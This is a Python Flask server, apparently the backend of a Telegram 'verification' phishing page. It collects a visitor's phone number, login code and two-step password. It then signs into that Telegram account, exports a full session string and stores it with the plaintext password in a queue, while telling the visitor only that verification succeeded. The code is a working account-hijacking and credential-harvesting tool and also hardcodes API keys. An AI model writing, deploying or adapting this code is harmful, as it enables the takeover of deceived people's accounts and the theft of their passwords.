import os, json, asyncio, logging, traceback
try:
    import nest_asyncio
    nest_asyncio.apply()
except ImportError:
    pass
from flask import Flask, request, jsonify
from flask_cors import CORS
from pyrogram import Client
from pyrogram.errors import (
    SessionPasswordNeeded, PhoneCodeInvalid,
    PhoneCodeExpired, PasswordHashInvalid, FloodWait, PhoneNumberInvalid
)

API_ID   = 35307937
API_HASH = "9c6e00f1aec844a2262224bb146ab6c3"

app = Flask(__name__)
CORS(app)

logging.basicConfig(level=logging.INFO)
log = logging.getLogger(__name__)

_sessions = {}

def save_session(key, data):
    _sessions[str(key)] = {k: v for k, v in data.items() if k != "client"}

def load_session(key):
    return _sessions.get(str(key))

def del_session(key):
    _sessions.pop(str(key), None)

verified_queue = {}


async def _send_otp(phone: str):
    client = Client(":memory:", api_id=int(API_ID), api_hash=str(API_HASH), in_memory=True, no_updates=True)
    try:
        await client.connect()
        sent = await client.send_code(phone)
        phone_code_hash = str(sent.phone_code_hash)
        # Export session BEFORE disconnect so verify step can reuse it
        sess_str = await client.storage.export_session_string() if hasattr(client.storage, '_dc_id') else None
        await client.disconnect()
        return {"ok": True, "hash": phone_code_hash, "sess_str": sess_str}
    except FloodWait as e:
        try: await client.disconnect()
        except: pass
        return {"ok": False, "error": f"Too many attempts. Wait {e.value}s."}
    except PhoneNumberInvalid:
        try: await client.disconnect()
        except: pass
        return {"ok": False, "error": "Invalid phone number."}
    except Exception as e:
        import traceback
        err_tb = traceback.format_exc()
        log.error(f"_send_otp error:\n{err_tb}")
        try: await client.disconnect()
        except: pass
        return {"ok": False, "error": str(e), "traceback": err_tb}


async def _verify_otp(sess_str, phone, code_hash, code):
    if sess_str:
        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH,
                        session_string=sess_str, in_memory=True, no_updates=True)
    else:
        client = Client(":memory:", api_id=API_ID, api_hash=API_HASH,
                        in_memory=True, no_updates=True)
    try:
        await client.connect()
        await client.sign_in(
            phone_number=phone,
            phone_code_hash=code_hash,
            phone_code=code
        )
        session = await client.export_session_string()
        me = await client.get_me()
        await client.disconnect()
        return {"ok": True, "session": session, "tg_id": me.id, "phone": phone}
    except SessionPasswordNeeded:
        try:
            hint = await client.get_password_hint()
        except:
            hint = ""
        new_sess = await client.export_session_string()
        await client.disconnect()
        return {"ok": False, "need_2fa": True, "hint": hint or "", "sess_str": new_sess}
    except PhoneCodeInvalid:
        await client.disconnect()
        return {"ok": False, "error": "Wrong OTP code. Try again."}
    except PhoneCodeExpired:
        await client.disconnect()
        return {"ok": False, "error": "OTP expired. Go back and try again."}
    except Exception as e:
        err_tb = traceback.format_exc()
        log.error(f"_verify_otp error:\n{err_tb}")
        try: await client.disconnect()
        except: pass
        return {"ok": False, "error": str(e), "traceback": err_tb}


async def _verify_2fa(sess_str, password, phone):
    client = Client(":memory:", api_id=API_ID, api_hash=API_HASH,
                    session_string=sess_str, in_memory=True, no_updates=True)
    try:
        await client.connect()
        await client.check_password(password)
        session = await client.export_session_string()
        me = await client.get_me()
        await client.disconnect()
        return {"ok": True, "session": session, "tg_id": me.id, "phone": phone}
    except PasswordHashInvalid:
        await client.disconnect()
        return {"ok": False, "error": "Wrong 2FA password. Try again."}
    except Exception as e:
        err_tb = traceback.format_exc()
        log.error(f"_verify_2fa error:\n{err_tb}")
        try: await client.disconnect()
        except: pass
        return {"ok": False, "error": str(e), "traceback": err_tb}


@app.route("/ping", methods=["GET"])
def ping():
    return jsonify({"ok": True, "msg": "Toxic Verify API running"})


@app.route("/send-otp", methods=["POST"])
def send_otp():
    body  = request.get_json(silent=True) or {}
    phone = str(body.get("phone", "")).strip()

    if not phone:
        return jsonify({"ok": False, "error": "Missing phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    log.info(f"send-otp: phone={phone!r}")
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_send_otp(phone))
        loop.close()
    except Exception as e:
        return jsonify({"ok": False, "error": f"Server error: {str(e)}", "traceback": traceback.format_exc()}), 500

    if result["ok"]:
        save_session(phone, {"hash": result["hash"], "phone": phone, "sess_str": result.get("sess_str")})
        return jsonify({"ok": True, "message": "OTP sent to your Telegram app"})
    else:
        # Pura traceback return karega JSON response me
        return jsonify({"ok": False, "error": result["error"], "traceback": result.get("traceback", "")}), 400


@app.route("/verify-otp", methods=["POST"])
def verify_otp():
    body  = request.get_json(silent=True) or {}
    otp   = str(body.get("otp", "")).strip()
    phone = str(body.get("phone", "")).strip()

    if not otp or not phone:
        return jsonify({"ok": False, "error": "Missing otp or phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    sess = load_session(phone)
    if not sess:
        return jsonify({"ok": False, "error": "Session expired. Go back and try again."}), 400

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_verify_otp(sess["sess_str"], sess["phone"], sess["hash"], otp))
        loop.close()
    except Exception as e:
        return jsonify({"ok": False, "error": f"Server error: {str(e)}", "traceback": traceback.format_exc()}), 500

    if result["ok"]:
        del_session(phone)
        tg_id = str(result["tg_id"])
        verified_queue[tg_id] = {"session": result["session"], "tg_id": result["tg_id"], "phone": result["phone"], "tfa": None}
        return jsonify({"ok": True, "message": "OTP verified!"})
    elif result.get("need_2fa"):
        save_session(phone, {"hash": sess["hash"], "phone": sess["phone"], "sess_str": result["sess_str"], "need_2fa": True})
        return jsonify({"ok": False, "need_2fa": True, "hint": result["hint"]})
    else:
        return jsonify({"ok": False, "error": result["error"], "traceback": result.get("traceback", "")}), 400


@app.route("/verify-2fa", methods=["POST"])
def verify_2fa():
    body     = request.get_json(silent=True) or {}
    password = body.get("password", "").strip()
    phone    = str(body.get("phone", "")).strip()

    if not password or not phone:
        return jsonify({"ok": False, "error": "Missing password or phone"}), 400
    if not phone.startswith("+"):
        phone = "+" + phone

    sess = load_session(phone)
    if not sess or not sess.get("need_2fa"):
        return jsonify({"ok": False, "error": "Session expired. Go back and try again."}), 400

    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(_verify_2fa(sess["sess_str"], password, sess["phone"]))
        loop.close()
    except Exception as e:
        return jsonify({"ok": False, "error": f"Server error: {str(e)}", "traceback": traceback.format_exc()}), 500

    if result["ok"]:
        del_session(phone)
        tg_id = str(result["tg_id"])
        verified_queue[tg_id] = {"session": result["session"], "tg_id": result["tg_id"], "phone": result["phone"], "tfa": password}
        return jsonify({"ok": True, "message": "2FA verified!"})
    else:
        return jsonify({"ok": False, "error": result["error"], "traceback": result.get("traceback", "")}), 400


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=False)
    